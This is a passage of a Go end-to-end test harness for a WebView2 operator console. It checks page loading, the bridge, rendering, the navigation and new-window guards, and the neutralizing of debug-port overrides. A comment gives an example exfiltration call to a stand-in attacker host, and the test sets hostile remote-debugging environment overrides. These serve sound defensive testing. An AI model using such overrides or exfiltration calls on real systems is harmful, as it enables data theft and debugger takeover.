//go:build windows

// e2e_windows_test.go is the end-to-end regression harness for
// cia-console.exe described by docs/adr/0018-webview-operator-console.md.
//
// It exists because four defects each produced the identical symptom - a
// window that opens, creates its WebView2 environment, completes
// navigation, and shows nothing - and every one of them was found only by
// opening the console by hand and instrumenting it:
//
//  1. The virtual host used the .localhost TLD, which Chromium special-cases
//     with built-in loopback resolution, competing with
//     SetVirtualHostNameToFolderMapping instead of deferring to it. Fixed by
//     switching to cia-console.invalid (RFC 2606).
//  2. Vite emitted <script crossorigin>/<link crossorigin>, putting
//     same-origin asset fetches in CORS mode, which
//     COREWEBVIEW2_HOST_RESOURCE_ACCESS_KIND_DENY_CORS refuses. Fixed in
//     frontend/vite.config.ts.
//  3. The controller was never resized - a window created at its final size
//     does not raise WM_SIZE, so it kept zero bounds. Fixed with an explicit
//     chromium.Resize() call.
//  4. The controller was never made visible - Embed leaves
//     ICoreWebView2Controller::IsVisible false, so its child windows existed
//     at the right size and composited nothing. Fixed with chromium.Show().
//
// This file launches the real binary, waits for the one-shot load
// self-check main_windows.go already emits under CIA_CONSOLE_DIAGNOSE, and
// separately inspects the live Win32 window tree and the process's own
// socket table and, as of Sprint 9, a conservative bitmap summary of the live
// WebView2 window. It never performs a model load and never exercises the
// bridge's mutation path: the point here is whether the window loads,
// composites, and is not visually blank.
//
// The diagnostic messages it consumes are gated behind CIA_CONSOLE_DIAGNOSE, so
// they do not change normal console behaviour. The page-side reports carry
// counts and dimensions only; the Sprint 9 pixel check samples the live Win32
// bitmap from the test process and logs only aggregate colour statistics.
package main

import (
	"bytes"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"testing"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// selfCheckTimeout bounds how long this test waits for main_windows.go's
// "load self-check:" line to appear on stderr. WebView2 environment
// creation - especially a cold one, on the memory-constrained machine this
// suite is meant to run on - can take tens of seconds; this is a ceiling,
// not an expected duration, and the poll loop below never sleeps anywhere
// near it in one step.
const selfCheckTimeout = 90 * time.Second

// selfCheckReport is the subset of main_windows.go's diagnose JSON payload
// (see NavigationCompletedCallback in main_windows.go) this test asserts
// against. Fields the JSON carries but this test does not need (bodyBg,
// bodyColor, firstChild, ...) are simply omitted; json.Unmarshal ignores
// object keys with no matching struct field.
type selfCheckReport struct {
	URL                   string                      `json:"url"`
	ReadyState            string                      `json:"readyState"`
	Viewport              string                      `json:"viewport"`
	BodyRect              string                      `json:"bodyRect"`
	Scripts               int                         `json:"scripts"`
	Stylesheets           int                         `json:"stylesheets"`
	RootChildren          int                         `json:"rootChildren"`
	TextLength            int                         `json:"textLength"`
	BridgeStatusRoundTrip bridgeStatusRoundTripReport `json:"bridgeStatusRoundTrip"`
}

// bridgeStatusRoundTripReport is the page's own account of the status
// round trip main_windows.go's diagnose script performs (see the doc
// comment above the chromium.Eval call in NavigationCompletedCallback): it
// posts {id, kind:"status"} through window.chrome.webview.postMessage
// (the exact call bridgeTransport.ts makes) and records what arrived at
// window.__ciaConsoleReply correlated by that same id.
type bridgeStatusRoundTripReport struct {
	Attempted   bool   `json:"attempted"`
	Matched     bool   `json:"matched"`
	TimedOut    bool   `json:"timedOut"`
	OK          bool   `json:"ok"`
	Service     string `json:"service"`
	Version     string `json:"version"`
	Ready       bool   `json:"ready"`
	ModelsCount int    `json:"modelsCount"`

	// The key sets that actually reached the page, reported by the diagnose
	// script. These exist because every scalar above survived the very
	// defect this harness now guards: routing the read through a narrower
	// host-side Go struct silently dropped a third of the payload while
	// service, version, ready and modelsCount all still arrived correct and
	// ok stayed true. Only comparing key sets catches that.
	StatusKeys      []string `json:"statusKeys"`
	ModelKeys       []string `json:"modelKeys"`
	ModelStatusKeys []string `json:"modelStatusKeys"`
	CapacityKeys    []string `json:"capacityKeys"`
	ErrorCode       string   `json:"errorCode"`
	Error           string   `json:"error"`
}

// statusFixtureSummary is the subset of frontend/src/api/__fixtures__/
// status.sample.json this test needs to compare the bridge round trip
// against - not the full shape (that is the frontend Zod schema's job; see
// src/api/schemas/status.test.ts).
type statusFixtureSummary struct {
	Service string            `json:"service"`
	Version string            `json:"version"`
	Ready   bool              `json:"ready"`
	Models  []json.RawMessage `json:"models"`
}

// readStatusFixture loads the real captured cia-edge response this test
// serves from its own loopback stand-in server (see statusServer above),
// and parses just enough of it to state what the page's bridge round trip
// ought to observe.
func readStatusFixture(t *testing.T, repoRoot string) ([]byte, statusFixtureSummary) {
	t.Helper()
	path := filepath.Join(repoRoot, "frontend", "src", "api", "__fixtures__", "status.sample.json")
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("read status fixture %s: %v", path, err)
	}
	var summary statusFixtureSummary
	if err := json.Unmarshal(data, &summary); err != nil {
		t.Fatalf("parse status fixture %s: %v", path, err)
	}
	return data, summary
}

// TestConsoleE2E is the harness. It is skipped unless CIA_CONSOLE_E2E=1 -
// it needs an interactive desktop session (WebView2 will not compose onto a
// headless/service session) and a built frontend/dist, so it must never run
// in CI or on a headless runner.
// ALWAYS RUN THIS WITH -count=1.
//
// Go caches a passing test result and replays it - log output included -
// whenever it believes the inputs are unchanged. It cannot see this harness's
// real inputs: a live WebView2 runtime, an interactive desktop session, the
// contents of frontend/dist that a *child process* reads, and whatever else
// on the machine is holding memory. A replayed pass here is indistinguishable
// from a real one in the output and means nothing, because no window was ever
// opened.
//
// That is not hypothetical. Three consecutive attempts to prove a new
// assertion had teeth - by deliberately breaking the code under it and
// expecting a failure - reported PASS from cache without launching anything,
// which read as "the assertion is useless" when the truth was "the test never
// ran". Any run whose purpose is to learn something must pass -count=1.
func TestConsoleE2E(t *testing.T) {
	if os.Getenv("CIA_CONSOLE_E2E") != "1" {
		t.Skip("set CIA_CONSOLE_E2E=1 to run this test; it launches a real top-level " +
			"window and requires an interactive desktop session (not a headless " +
			"runner or a service session) plus a built frontend at frontend/dist " +
			"(see the frontend build step in cmd/cia-console/README.md)")
	}

	_, thisFile, _, ok := runtime.Caller(0)
	if !ok {
		t.Fatal("runtime.Caller(0) could not resolve this test file's own path")
	}
	pkgDir := filepath.Dir(thisFile)
	repoRoot := filepath.Dir(filepath.Dir(pkgDir)) // cmd/cia-console -> cmd -> repo root
	distDir := filepath.Join(repoRoot, "frontend", "dist")
	distIndex := filepath.Join(distDir, "index.html")
	if info, err := os.Stat(distIndex); err != nil || info.IsDir() {
		t.Skipf("no built frontend at %s (run the frontend build in %s first, e.g. "+
			"`npm run build`); CIA_CONSOLE_E2E=1 requires it because the console has "+
			"nothing to serve without it", distIndex, filepath.Join(repoRoot, "frontend"))
	}

	// A loopback stand-in for cia-edge's real /api/v1/status, so the bridge
	// round-trip assertion below (bridge_status_round_trip) observes real,
	// specific data - not just "some reply arrived" - without needing an
	// actual cia-edge process, a model runtime, or any model load on this
	// memory-constrained machine. It serves the exact JSON already captured
	// from a real cia-edge instance (frontend/src/api/__fixtures__/status.
	// sample.json - the same fixture src/api/schemas/status.test.ts and the
	// Zod schema itself are derived from), so mcpserver.ControlClient.Status
	// (called from inside cia-console.exe, wired via CIA_CONTROL_URL below)
	// does real, bounded, loopback-only HTTP against it exactly as it would
	// against the genuine service.
	fixtureBytes, fixtureSummary := readStatusFixture(t, repoRoot)
	statusServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/api/v1/status" {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write(fixtureBytes)
	}))
	t.Cleanup(statusServer.Close)

	binPath := buildConsoleBinary(t, pkgDir)
	debugPort := freeTCPPort(t)

	env := os.Environ()
	env = withEnvOverride(env, "CIA_CONSOLE_DIAGNOSE", "1")
	env = withEnvOverride(env, "CIA_ENVIRONMENT", "canary")
	env = withEnvOverride(env, "CIA_CONSOLE_FRONTEND_DIR", distDir)
	env = withEnvOverride(env, "CIA_CONTROL_URL", statusServer.URL)
	// The hostile overrides ADR 0018 control 2 exists to defeat: a
	// serving-user process setting these once should turn every subsequent
	// WebView2 launch into a debuggable Chromium instance. webviewloader's
	// init() (see env_windows.go) must neutralize both before this process
	// ever creates a WebView2 environment.
	env = withEnvOverride(env, "WEBVIEW2_ADDITIONAL_BROWSER_ARGUMENTS", fmt.Sprintf("--remote-debugging-port=%d", debugPort))
	env = withEnvOverride(env, "WEBVIEW2_PIPE_FOR_SCRIPT_DEBUGGER", "1")

	cmd := exec.Command(binPath)
	cmd.Env = env
	cmd.Dir = filepath.Dir(binPath)
	var stderrBuf syncBuffer
	cmd.Stderr = &stderrBuf
	cmd.Stdout = io.Discard

	if err := cmd.Start(); err != nil {
		t.Fatalf("start %s: %v", binPath, err)
	}
	pid := uint32(cmd.Process.Pid)

	// A Job Object with JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE is how cleanup
	// below can be sure the WebView2 helper processes (msedgewebview2.exe)
	// die too, not just the top-level cia-console.exe: any child process
	// created by a process already in the job automatically joins it, and
	// closing the job handle (or TerminateJobObject) tears down every
	// member at once. This is assigned immediately after Start(), before
	// main_windows.go's main() reaches Embed() and the environment spawns
	// its own child processes.
	var job windows.Handle
	if h, jerr := windows.CreateJobObject(nil, nil); jerr != nil {
		t.Logf("CreateJobObject: %v (cleanup will only be able to kill the top-level process, not its WebView2 helpers)", jerr)
	} else {
		job = h
		limits := windows.JOBOBJECT_EXTENDED_LIMIT_INFORMATION{
			BasicLimitInformation: windows.JOBOBJECT_BASIC_LIMIT_INFORMATION{
				LimitFlags: windows.JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE,
			},
		}
		if _, serr := windows.SetInformationJobObject(
			job, windows.JobObjectExtendedLimitInformation,
			uintptr(unsafe.Pointer(&limits)), uint32(unsafe.Sizeof(limits)),
		); serr != nil {
			t.Logf("SetInformationJobObject: %v (cleanup will only be able to kill the top-level process, not its WebView2 helpers)", serr)
		} else if procHandle, operr := windows.OpenProcess(windows.PROCESS_ALL_ACCESS, false, pid); operr != nil {
			t.Logf("OpenProcess(%d): %v (cleanup will only be able to kill the top-level process, not its WebView2 helpers)", pid, operr)
		} else {
			if aerr := windows.AssignProcessToJobObject(job, procHandle); aerr != nil {
				t.Logf("AssignProcessToJobObject: %v (cleanup will only be able to kill the top-level process, not its WebView2 helpers)", aerr)
			}
			_ = windows.CloseHandle(procHandle)
		}
	}

	done := make(chan struct{})
	go func() {
		_ = cmd.Wait()
		close(done)
	}()

	// Always kill the process (and, via the job object, its WebView2
	// children) even if an assertion below fails or panics.
	t.Cleanup(func() {
		if job != 0 {
			_ = windows.TerminateJobObject(job, 1)
			_ = windows.CloseHandle(job)
		}
		if cmd.Process != nil {
			_ = cmd.Process.Kill()
		}
		select {
		case <-done:
		case <-time.After(10 * time.Second):
			t.Log("cia-console.exe did not exit within 10s of being killed")
		}
	})

	raw, err := waitForSelfCheck(&stderrBuf, done, selfCheckTimeout)
	if err != nil {
		// Assertion 1: the self-check line must arrive at all. Every one of
		// the four defects in the package doc comment above presents as
		// exactly this: a window that loads and navigates but never shows
		// anything, and here, never reports anything either.
		t.Fatalf("assertion 1 (load self-check must arrive): %v\n"+
			"stderr:\n%s", err, stderrBuf.String())
	}
	if strings.HasPrefix(raw, "threw:") {
		t.Fatalf("assertion 1: the load self-check script itself threw inside the page: %s", raw)
	}
	var report selfCheckReport
	if err := json.Unmarshal([]byte(raw), &report); err != nil {
		t.Fatalf("assertion 1: load self-check line was not valid JSON: %v\nraw line: %s", err, raw)
	}
	t.Logf("load self-check: %s", raw)

	// Find the host's top-level window. This must succeed before assertion
	// 7 (child window visibility, defect 4's guard) can run at all: without
	// it there is no window to enumerate children of.
	mainHWND := findMainWindow(pid, windowTitle)

	t.Run("virtual_host_serves_the_page", func(t *testing.T) {
		// Guards: Chromium's built-in .localhost loopback resolution
		// competing with SetVirtualHostNameToFolderMapping (main_windows.go,
		// virtualHostName). Asserted against the parsed host, not a
		// substring of the URL, so a path or query string containing
		// "cia-console.invalid" could never make this pass by accident.
		parsed, perr := url.Parse(report.URL)
		if perr != nil {
			t.Fatalf("virtual host: url %q did not parse: %v", report.URL, perr)
		}
		if parsed.Scheme != "https" {
			t.Errorf("virtual host: scheme = %q, want %q (url: %s)", parsed.Scheme, "https", report.URL)
		}
		if parsed.Hostname() != virtualHostName {
			t.Errorf("virtual host: host = %q, want %q - the .localhost-vs-.invalid "+
				"regression: Chromium special-cases the .localhost TLD with built-in "+
				"loopback resolution that competes with the virtual host mapping instead "+
				"of deferring to it (url: %s)", parsed.Hostname(), virtualHostName, report.URL)
		}
		if parsed.Path != "/index.html" {
			t.Errorf("virtual host: path = %q, want %q (url: %s)", parsed.Path, "/index.html", report.URL)
		}
		if want := "https://" + virtualHostName + "/index.html"; report.URL != want {
			t.Errorf("virtual host: url = %q, want exactly %q", report.URL, want)
		}
	})

	t.Run("ready_state_complete", func(t *testing.T) {
		if report.ReadyState != "complete" {
			t.Errorf("readyState = %q, want %q", report.ReadyState, "complete")
		}
	})

	t.Run("page_assets_loaded", func(t *testing.T) {
		// The task guarding defect 2 (Vite's crossorigin attribute putting
		// same-origin fetches into CORS mode, refused by
		// COREWEBVIEW2_HOST_RESOURCE_ACCESS_KIND_DENY_CORS) asks for
		// document.scripts.length >= 1 and document.styleSheets.length >= 1.
		// Guards defect 2 directly: Vite emits <script crossorigin> and
		// <link crossorigin> by default, which puts a same-origin asset fetch
		// into CORS mode; the host maps its virtual host with
		// COREWEBVIEW2_HOST_RESOURCE_ACCESS_KIND_DENY_CORS and refuses exactly
		// that. Both counts drop to 0 and the window renders blank while
		// navigation still reports complete. frontend/vite.config.ts strips the
		// attribute; this is what notices if that plugin is ever removed.
		if report.Scripts < 1 {
			t.Errorf("page assets: document.scripts.length is %d, want >= 1 - "+
				"the page's own script did not load. Check that vite.config.ts still "+
				"strips `crossorigin` from the emitted asset tags, and that the "+
				"virtual host mapping's access kind still matches.", report.Scripts)
		}
		if report.Stylesheets < 1 {
			t.Errorf("page assets: document.styleSheets.length is %d, want >= 1 - "+
				"the page's stylesheet did not load, same cause as the script count "+
				"above.", report.Stylesheets)
		}
	})

	t.Run("controller_has_nonzero_bounds", func(t *testing.T) {
		// Guards: the controller never being resized (main_windows.go's
		// chromium.Resize() call) - a window created at its final size does
		// not raise WM_SIZE, so without the explicit call the controller
		// keeps the zero bounds it was embedded with.
		vw, vh, verr := parseWxH(report.Viewport)
		if verr != nil {
			t.Fatalf("controller bounds: viewport %q: %v", report.Viewport, verr)
		}
		if vw <= 0 || vh <= 0 {
			t.Errorf("controller bounds: viewport = %dx%d, want both > 0 - this is what an "+
				"unresized controller looks like", vw, vh)
		}
		bw, bh, berr := parseWxH(report.BodyRect)
		if berr != nil {
			t.Fatalf("controller bounds: bodyRect %q: %v", report.BodyRect, berr)
		}
		if bw <= 0 || bh <= 0 {
			t.Errorf("controller bounds: bodyRect = %dx%d, want both > 0 - this is what an "+
				"unresized controller looks like", bw, bh)
		}
	})

	t.Run("react_mounted", func(t *testing.T) {
		if report.RootChildren < 1 {
			t.Errorf("rootChildren = %d, want >= 1: React never mounted into #root "+
				"(a refused or missing bundle would leave this at 0)", report.RootChildren)
		}
		if report.TextLength <= 0 {
			t.Errorf("textLength = %d, want > 0: the mounted document rendered no visible text "+
				"(a refused or missing bundle would leave this at 0)", report.TextLength)
		}
	})

	t.Run("bridge_status_round_trip", func(t *testing.T) {
		// Guards: the entire point of the correlation work - that a page request and the
		// host's reply to it are actually correlated by id, so the page can
		// tell which in-flight request a reply belongs to. This does not
		// merely check that Bridge.Handle can be called (bridge_test.go's
		// TestHandleMessage* cover that in isolation, with no WebView2, no
		// real window, and no id correlation over postMessage/Eval at all);
		// it drives the real page, inside the real window, through the real
		// window.chrome.webview.postMessage -> host -> window.
		// __ciaConsoleReply path, and checks the specific data that arrived
		// against the fixture statusServer served.
		rt := report.BridgeStatusRoundTrip
		if !rt.Attempted {
			t.Fatalf("bridge status round trip: the page never attempted a status request through the bridge: %+v", rt)
		}
		if rt.TimedOut {
			t.Fatalf("bridge status round trip: no reply correlated back to the page's own request id within the "+
				"10s the diagnose script waits: %+v", rt)
		}
		if !rt.Matched {
			t.Fatalf("bridge status round trip: window.__ciaConsoleReply never observed a reply whose id matched "+
				"the page's own request: %+v", rt)
		}
		if !rt.OK {
			t.Fatalf("bridge status round trip: the bridge replied with ok=false, error code %q: %+v", rt.ErrorCode, rt)
		}
		if rt.Service != fixtureSummary.Service {
			t.Errorf("bridge status round trip: service = %q, want %q (the fixture value the loopback stand-in served)",
				rt.Service, fixtureSummary.Service)
		}
		if rt.Version != fixtureSummary.Version {
			t.Errorf("bridge status round trip: version = %q, want %q", rt.Version, fixtureSummary.Version)
		}
		if rt.Ready != fixtureSummary.Ready {
			t.Errorf("bridge status round trip: ready = %v, want %v", rt.Ready, fixtureSummary.Ready)
		}
		if rt.ModelsCount != len(fixtureSummary.Models) {
			t.Errorf("bridge status round trip: modelsCount = %d, want %d", rt.ModelsCount, len(fixtureSummary.Models))
		}
		t.Logf("bridge status round trip observed in the page: service=%q version=%q ready=%v modelsCount=%d "+
			"(correlated via id through window.chrome.webview.postMessage -> Bridge.Handle -> window.__ciaConsoleReply)",
			rt.Service, rt.Version, rt.Ready, rt.ModelsCount)
	})

	t.Run("bridge_status_arrives_intact", func(t *testing.T) {
		// Guards: silent field loss between cia-edge and the page.
		//
		// The subtest above passed for an entire sprint while the console
		// rendered an error state, because the host was decoding the
		// snapshot into a Go struct declaring only a subset of its fields
		// and re-marshalling that subset. Everything that subtest checks -
		// service, version, ready, the model count, ok - is in the surviving
		// subset, so nothing it asserts could go wrong. What broke was the
		// page's own schema validation, on fields nothing in Go was looking
		// at.
		//
		// The stand-in status server serves frontend/src/api/__fixtures__/
		// status.sample.json verbatim, and the frontend's StatusSchema is
		// derived from that same file, so every key required below is one
		// the page genuinely needs and the fixture genuinely sends. Checking
		// presence (not values) keeps this a transport assertion: whether a
		// figure is right is cia-edge's business, whether it arrives at all
		// is the bridge's.
		rt := report.BridgeStatusRoundTrip
		if !rt.Matched || !rt.OK {
			t.Skip("no successful round trip to inspect; see bridge_status_round_trip")
		}

		// Required by StatusSchema in frontend/src/api/schemas/status.ts.
		// `deployment` is deliberately absent: the schema makes it optional
		// because a machine with no release manifest installed omits it.
		assertKeys(t, "status", rt.StatusKeys, []string{
			"active_model", "capacity", "gate", "gpu_memory", "maintenance",
			"model_statuses", "models", "ready", "recent_events", "runtimes",
			"service", "upstream", "uptime_seconds", "version",
		})
		assertKeys(t, "models[0]", rt.ModelKeys, []string{
			"capabilities", "display_name", "id", "object", "owned_by",
		})
		assertKeys(t, "model_statuses[0]", rt.ModelStatusKeys, []string{
			"active", "available", "capacity", "checkpoints", "context_tokens",
			"id", "profile", "runtime",
		})
		assertKeys(t, "capacity", rt.CapacityKeys, []string{
			"admission", "available", "commit_headroom_gib", "device_vram_gib",
			"measured", "model", "model_running", "physical_headroom_gib",
			"required_commit_gib", "required_physical_gib", "required_vram_gib",
			"reserve_commit_gib", "reserve_physical_gib", "reserve_vram_gib",
		})
	})

	t.Run("page_renders_the_status_it_received", func(t *testing.T) {
		// Guards: the last gap between "the host delivered correct bytes"
		// and "the operator can see something".
		//
		// Every assertion before this one is satisfied by a console showing
		// nothing but an error card. The window composites, React mounts,
		// the bridge round trip correlates, the payload arrives intact - and
		// the page can still render a failure, because whether the data
		// satisfies the page's own schema is decided in the page, after all
		// of that. This is the only assertion here that would notice.
		//
		// It reads the page's accessibility state rather than any private
		// class name: aria-busy is still-pending, role="alert" is failed,
		// neither is rendered. That keeps the assertion tied to something
		// the console owes its operator anyway, instead of to markup that
		// may legitimately be restyled.
		raw, err := waitForRenderCheck(&stderrBuf, done, 20*time.Second)
		if err != nil {
			t.Fatalf("render self-check: %v", err)
		}
		if strings.HasPrefix(raw, "threw: ") {
			t.Fatalf("the render self-check script threw inside the page: %s", raw)
		}
		var render renderSelfCheck
		if err := json.Unmarshal([]byte(raw), &render); err != nil {
			t.Fatalf("render self-check was not valid JSON: %v; raw line: %s", err, raw)
		}
		t.Logf("render self-check: %s", raw)

		if render.AlertRegions > 0 {
			t.Errorf("the settled page is showing %d alert region(s): the status arrived intact but the page "+
				"still rendered a failure, so the defect is now on the page's side of the bridge "+
				"(schema validation or the view model), not the host's", render.AlertRegions)
		}
		if render.BusyRegions > 0 {
			t.Errorf("the settled page still has %d region(s) marked aria-busy: the query never resolved for "+
				"the page even though the bridge replied", render.BusyRegions)
		}
		// The loading state is a heading and one short status line. A screen
		// that actually rendered a six-model status snapshot is far longer.
		// The bound is deliberately loose - this asserts "something
		// substantial rendered", not any particular copy.
		const minRenderedTextLength = 200
		if render.TextLength < minRenderedTextLength {
			t.Errorf("the settled page holds only %d characters of text (want at least %d): the page is not "+
				"showing the status it received", render.TextLength, minRenderedTextLength)
		}
	})

	t.Run("visual_layout_geometry_is_stable", func(t *testing.T) {
		raw, err := waitForVisualCheck(&stderrBuf, done, 20*time.Second)
		if err != nil {
			t.Fatalf("visual self-check: %v", err)
		}
		if strings.HasPrefix(raw, "threw: ") {
			t.Fatalf("the visual self-check script threw inside the page: %s", raw)
		}
		var visual visualSelfCheck
		if err := json.Unmarshal([]byte(raw), &visual); err != nil {
			t.Fatalf("visual self-check was not valid JSON: %v; raw line: %s", err, raw)
		}
		t.Logf("visual self-check: %s", raw)

		if visual.ViewportWidth < 1000 || visual.ViewportHeight < 700 {
			t.Errorf("visual geometry: viewport = %dx%d, want at least 1000x700 for the "+
				"default console window", visual.ViewportWidth, visual.ViewportHeight)
		}
		if visual.InvisibleCritical > 0 {
			t.Errorf("visual geometry: %d critical layout region(s) were missing or invisible "+
				"(app shell, main column, content, nav, and main must all be present)", visual.InvisibleCritical)
		}
		if visual.HorizontalOverflow > 1 {
			t.Errorf("visual geometry: horizontal overflow = %dpx (document=%dpx body=%dpx viewport=%dpx), "+
				"want <= 1px so the default window does not clip or require sideways scrolling",
				visual.HorizontalOverflow, visual.DocumentScrollWidth, visual.BodyScrollWidth, visual.ViewportWidth)
		}
		if visual.PrimaryNavButtons < 5 {
			t.Errorf("visual geometry: %d visible primary-nav button(s), want at least 5 "+
				"(four destinations plus the collapse control)", visual.PrimaryNavButtons)
		}
		if visual.MainHeadings < 1 {
			t.Errorf("visual geometry: no visible main heading rendered")
		}
		if visual.OverviewSections < 4 {
			t.Errorf("visual geometry: %d visible Overview section(s), want the four default summary sections",
				visual.OverviewSections)
		}
		if visual.VisibleButtons < visual.PrimaryNavButtons {
			t.Errorf("visual geometry: visibleButtons=%d is smaller than primaryNavButtons=%d, "+
				"which means the visual counter disagrees with itself", visual.VisibleButtons, visual.PrimaryNavButtons)
		}
		if visual.InteractiveTooSmall > 0 {
			t.Errorf("visual geometry: %d visible interactive control(s) are smaller than 28x28px",
				visual.InteractiveTooSmall)
		}
	})

	t.Run("visual_snapshot_is_nonblank", func(t *testing.T) {
		if mainHWND == 0 {
			t.Fatalf("visual snapshot: could not find a top-level window titled %q owned by pid %d",
				windowTitle, pid)
		}
		target := largestVisibleChild(mainHWND)
		if target == 0 {
			target = mainHWND
		}
		_, _, _ = procSetForegroundWindow.Call(uintptr(mainHWND))
		time.Sleep(250 * time.Millisecond)

		summary, err := captureWindowPixels(target)
		if err != nil {
			t.Fatalf("visual snapshot: %v", err)
		}
		t.Logf("visual snapshot: hwnd=%#x size=%dx%d quantizedColors=%d dominantRatio=%.4f dark=%d mid=%d light=%d",
			uintptr(target), summary.Width, summary.Height, summary.QuantizedColors, summary.DominantRatio,
			summary.DarkPixels, summary.MidPixels, summary.LightPixels)

		if summary.Width < 900 || summary.Height < 600 {
			t.Errorf("visual snapshot: capture size = %dx%d, want at least 900x600 for the WebView2 content",
				summary.Width, summary.Height)
		}
		if summary.QuantizedColors < 10 {
			t.Errorf("visual snapshot: only %d quantized colour bucket(s), want at least 10; "+
				"this is what a blank or failed WebView2 composition often looks like", summary.QuantizedColors)
		}
		if summary.DominantRatio > 0.985 {
			t.Errorf("visual snapshot: one colour bucket accounts for %.2f%% of pixels, want <= 98.5%%; "+
				"the console is effectively monochrome/blank", summary.DominantRatio*100)
		}
		if summary.DarkPixels < 100 || summary.LightPixels < 100 {
			t.Errorf("visual snapshot: dark=%d light=%d, want at least 100 of each so the captured "+
				"window contains both background and foreground/text pixels", summary.DarkPixels, summary.LightPixels)
		}
	})

	t.Run("navigation_guard_refuses_leaving_the_virtual_host", func(t *testing.T) {
		// Guards: ADR 0018's fifth control, which until now did not exist.
		//
		// The first attempt at navigation containment registered a
		// WebResourceRequested filter and refused anything off-host. It never
		// fired - WebView2 resolves virtual-host resources below that layer -
		// so it was inert code that read as a control for an entire sprint.
		// The lesson is the shape of this test: a guard is only demonstrated
		// by making it refuse something, never by observing that it is
		// registered.
		//
		// The page deliberately assigns window.location to an off-host target
		// (navProbeTarget, an RFC 2606 .invalid host that resolves nowhere,
		// so a failed guard cannot turn this probe into contact with a third
		// party), then posts a marker afterwards. Two independent signals
		// have to agree: the page is still alive to send that marker at all,
		// and the guard's own counter recorded the refusal.
		raw, err := waitForNavGuardCheck(&stderrBuf, done, 25*time.Second)
		if err != nil {
			t.Fatalf("navigation guard self-check: %v", err)
		}
		var guard navGuardSelfCheck
		if err := json.Unmarshal([]byte(raw), &guard); err != nil {
			t.Fatalf("navigation guard self-check was not valid JSON: %v; raw line: %s", err, raw)
		}
		t.Logf("navigation guard self-check: %s", raw)

		if !guard.Installed {
			t.Fatalf("the navigation guard was never installed, so nothing was containing navigation at all: %+v", guard)
		}
		if !guard.PageSurvived {
			t.Errorf("the page did not survive its own navigation probe: %+v", guard)
		}
		if guard.Refusals < 1 {
			t.Fatalf("the guard is installed but refused nothing after the page tried to navigate to %s - "+
				"an installed handler that never fires is exactly the inert control this test exists to "+
				"rule out: %+v", navProbeTarget, guard)
		}
		if guard.LastRefusedURI != navProbeTarget {
			t.Errorf("the guard refused %q, want the probe target %q - something else was refused and the "+
				"probe itself may not have been", guard.LastRefusedURI, navProbeTarget)
		}

		// The second channel. A NavigationStarting handler does not fire for
		// window.open, and no Content-Security-Policy closes it: CSP governs
		// what a document may fetch, embed and execute, not whether the
		// browser may open a window. A compromised page that cannot
		// fetch("https://attacker.test?x=" + secret) can window.open the same
		// URL and the data leaves in the request line just the same. Only the
		// host's NewWindowRequested refusal stops it, so it is asserted
		// separately rather than folded into the count above.
		if !guard.WindowGuardInstalled {
			t.Fatalf("the new-window guard was never installed, so window.open remained an open egress "+
				"channel even with navigation contained: %+v", guard)
		}
		if guard.WindowRefusals < 1 {
			t.Fatalf("the new-window guard is installed but refused nothing after the page called "+
				"window.open(%s) - an installed handler that never fires is exactly the inert control "+
				"these assertions exist to rule out: %+v", navProbeTarget, guard)
		}
		if guard.LastRefusedWindowURI != navProbeTarget {
			t.Errorf("the new-window guard refused %q, want the probe target %q",
				guard.LastRefusedWindowURI, navProbeTarget)
		}
	})

	t.Run("regression_controller_visibility", func(t *testing.T) {
		// Guards: the controller never being made visible
		// (main_windows.go's chromium.Show() call) - Embed creates and sizes
		// the controller's child windows (Chrome_WidgetWin_0/_1 and the
		// intermediate D3D window) but leaves IsVisible false, so they exist
		// at the right size and composite nothing. This is the one defect
		// the in-page self-check cannot see - the page is fully loaded,
		// styled and mounted while the window shows nothing - so it has to
		// be checked from outside, against the real Win32 window tree.
		if mainHWND == 0 {
			t.Fatalf("controller-visibility regression: could not find a top-level window titled %q owned by "+
				"pid %d - the process may have exited, or main_windows.go's own window was "+
				"never created", windowTitle, pid)
		}
		children := listChildWindows(mainHWND)
		if len(children) == 0 {
			t.Fatalf("controller-visibility regression: host window (owned by pid %d) has no child windows at "+
				"all - Embed() apparently never created the WebView2 controller's child windows", pid)
		}
		// At least one child must be visible - not every child.
		//
		// This assertion used to require all of them, which was correct only
		// while every child window belonged to the compositing controller. It
		// stopped being true when the harness began probing window.open: a
		// REFUSED new-window request still leaves a hidden child window behind,
		// so the strict form began failing on a console that was compositing
		// perfectly. Isolating it confirmed that - disabling only the
		// window.open probe made this pass again, with nothing else changed.
		//
		// "At least one visible" still catches the defect this exists for.
		// Leaving IsVisible false on the controller hides its entire tree, so
		// the failure mode is every child invisible, never some. Loosening
		// from "all" to "at least one" therefore gives up nothing real, and
		// the alternative - filtering by window class - would tie this test to
		// undocumented WebView2 internals that a runtime update may rename.
		visible := 0
		for _, child := range children {
			if windows.IsWindowVisible(child) {
				visible++
			}
		}
		if visible == 0 {
			t.Errorf("controller-visibility regression: none of the host window's %d child window(s) is "+
				"visible - this is exactly the missing chromium.Show() regression: the controller's "+
				"child windows exist at the right size and composite nothing even though the page "+
				"loaded, styled and mounted correctly", len(children))
		}
		t.Logf("controller visibility: %d of %d child window(s) visible", visible, len(children))
	})

	t.Run("control2_hostile_debug_port_has_no_listener", func(t *testing.T) {
		// ADR 0018 control 2, verification clause: "with --remote-debugging-
		// port set in the parent environment, the console starts and no
		// listener appears." This dials the exact port this test told the
		// child (via WEBVIEW2_ADDITIONAL_BROWSER_ARGUMENTS) to open a
		// remote-debugging listener on.
		if dialSucceeds(debugPort) {
			t.Errorf("ADR 0018 control 2 guard: something is listening on 127.0.0.1:%d, the "+
				"hostile --remote-debugging-port this test set via "+
				"WEBVIEW2_ADDITIONAL_BROWSER_ARGUMENTS - the ambient-environment override was "+
				"honoured instead of neutralized by webviewloader's init()", debugPort)
		}
	})

	t.Run("control2_process_owns_no_listening_socket", func(t *testing.T) {
		// ADR 0018's "no port opens" property, checked against the live
		// process rather than assumed: every TCP listening socket on the
		// machine is enumerated with its owning PID (via
